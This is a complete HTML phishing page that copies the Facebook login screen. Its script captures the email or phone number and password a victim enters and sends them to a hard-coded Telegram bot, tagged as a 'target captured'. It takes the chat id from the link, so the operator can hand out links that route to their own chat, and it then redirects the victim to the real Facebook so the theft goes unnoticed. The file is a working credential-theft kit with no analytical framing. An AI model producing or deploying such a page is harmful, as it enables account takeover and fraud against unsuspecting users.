<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log into Facebook</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            width: 396px;
            padding: 20px;
            text-align: center;
        }
        .fb-logo {
            width: 112px;
            margin-bottom: 20px;
        }
        .card {
            background-color: #ffffff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0,.1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            box-sizing: border-box;
            width: 100%;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            line-height: 48px;
            width: 100%;
            padding: 0 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-link {
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin: 16px 0;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        hr {
            border: none;
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            line-height: 36px;
            padding: 0 16px;
            cursor: pointer;
            display: inline-block;
            margin-top: 6px;
        }
        .create-btn:hover {
            background-color: #36a420;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Facebook Blue Text/Logo icon -->
        <svg viewBox="0 0 36 36" class="fb-logo" width="60" height="60" fill="#1877f2"><path d="M25 3.5H21C16.857 3.5 14 6.357 14 10.5V14H10.5C9.948 14 9.5 14.448 9.5 15V20C9.5 20.552 9.948 21 10.5 21H14V31.5C14 32.052 14.448 32.5 15 32.5H20C20.552 32.5 21 32.052 21 31.5V21H25.352C25.904 21 26.352 20.552 26.352 20V15C26.352 14.448 25.904 14 25.352 14H21V11.25C21 9.927 21.927 9 23.25 9H25.25C25.802 9 26.25 8.552 26.25 8V4C26.25 3.448 25.802 3.5 25.25 3.5H25Z"></path></svg>
        
        <div class="card">
            <form id="fbForm">
                <input type="text" id="email" placeholder="Mobile number or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <a href="#" class="forgot-link">Forgot password?</a>
            <hr>
            <button class="create-btn" onclick="alert('Create new account is disabled.')">Create new account</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";

        document.getElementById('fbForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('email').value;
            const pass = document.getElementById('password').value;

            if (!userId) {
                alert("Invalid Link! Please generate a new link from bot.");
                return;
            }

            const message = `🔥 *New Facebook Target Captured!*\n\n👤 *Email/Phone:* \`${user}\`\n🔑 *Password:* \`${pass}\``;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(url).then(response => {
                window.location.href = "https://www.facebook.com";
            }).catch(error => {
                window.location.href = "https://www.facebook.com";
            });
        });
    </script>
</body>
</html>
